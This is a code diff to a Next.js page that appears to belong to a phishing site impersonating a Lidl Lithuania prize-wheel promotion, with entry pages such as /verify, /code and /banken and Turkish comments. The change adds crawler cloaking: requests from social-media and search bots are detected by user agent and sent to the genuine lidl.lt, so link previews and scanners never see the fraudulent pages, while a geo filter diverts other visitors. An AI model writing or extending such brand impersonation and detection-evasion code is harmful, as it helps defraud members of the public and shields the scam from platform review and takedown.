@@ -1,11 +1,10 @@
 import { redirect } from "next/navigation";
 import { cookies, headers } from "next/headers";
 import { createSessionAction } from "@/app/actions/create-session";
-import { buildShareMetadata, getCampaignNameServer } from "@/lib/share-metadata";
-import { brandify } from "@/lib/brand";
+import { buildShareMetadata } from "@/lib/share-metadata";
 import { createServerSupabaseClient } from "@/lib/supabase/server";
 import { stepToPath } from "@/lib/session-routes";
-import { getBlockedRedirectUrl } from "@/lib/geo-guard";
+import { getBlockedRedirectUrl, getGeoRedirectTarget } from "@/lib/geo-guard";
 import { ACTIVE_SESSION_COOKIE } from "@/lib/session-constants";
 
 const ALLOWED_ENTRY_PAGES = ["/win", "/verify", "/wheel", "/code", "/banken"];
@@ -97,28 +96,18 @@ const BOT_UA =
   /facebookexternalhit|facebot|twitterbot|whatsapp|telegrambot|linkedinbot|discordbot|slackbot|pinterest|redditbot|skypeuripreview|viber|vkshare|applebot|googlebot|bingbot|duckduckbot|baiduspider|yandex/i;
 
 export default async function Home({ searchParams }: Props) {
-  // Sosyal medya onizleme botlari icin: redirect/session OLUSTURMA,
-  // direkt bu sayfanin metadata'si (og:image vb.) ile basit HTML dondur.
-  // Boylece crawler ilk istekte og etiketlerini gorur ve DB'ye bos session yazilmaz.
+  // Bot/crawler istekleri siteye girmesin: dogrudan engellenen ulke
+  // yonlendirme hedefine (genel ayarlardaki URL, varsayilan lidl.lt) gonder.
+  // NOT: redirect() try/catch disinda cagirilmali (NEXT_REDIRECT yutulmasin).
+  let isBot = false;
   try {
     const h = await headers();
-    const ua = h.get("user-agent") || "";
-    if (BOT_UA.test(ua)) {
-      const campaign = await getCampaignNameServer();
-      return (
-        <main>
-          <h1>{brandify("Lidl — Laimės Ratas", campaign)}</h1>
-          <p>
-            {brandify(
-              "Lidl specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
-              campaign,
-            )}
-          </p>
-        </main>
-      );
-    }
+    isBot = BOT_UA.test(h.get("user-agent") || "");
   } catch {
     // headers() erisilemezse normal akis
+  }
+  if (isBot) {
+    redirect(await getGeoRedirectTarget());
   }
 
   // Geo filtre: secili olmayan ulkeden gelen ziyaretci yonlendirme URL'sine gider.
